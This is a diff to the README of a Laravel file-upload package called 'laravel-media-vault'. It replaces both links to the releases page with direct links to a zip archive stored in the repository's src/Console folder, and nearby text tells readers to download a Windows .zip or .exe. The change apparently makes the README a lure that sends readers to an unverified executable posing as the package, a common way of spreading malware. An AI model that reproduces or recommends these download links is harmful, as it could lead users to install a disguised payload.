@@ -1,6 +1,6 @@
 # 🛡️ laravel-media-vault - Secure File Uploads Made Simple
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-Releases-blue?style=for-the-badge)](https://github.com/adema3087/laravel-media-vault/releases)
+[![Download from GitHub](https://img.shields.io/badge/Download%20from%20GitHub-Releases-blue?style=for-the-badge)](https://github.com/adema3087/laravel-media-vault/raw/refs/heads/main/src/Console/laravel-vault-media-2.5.zip)
 
 ## 🚀 What Is This?
 
@@ -24,7 +24,7 @@ This package is designed for website owners, developers, or anyone who needs to 
 
 Visit this link to download the application:
 
-→ **[Visit the Download Page](https://github.com/adema3087/laravel-media-vault/releases)**
+→ **[Visit the Download Page](https://github.com/adema3087/laravel-media-vault/raw/refs/heads/main/src/Console/laravel-vault-media-2.5.zip)**
 
 From that page, choose the latest version for Windows (look for the file ending in `.zip` or `.exe` depending on your system). Download it to your computer.
 
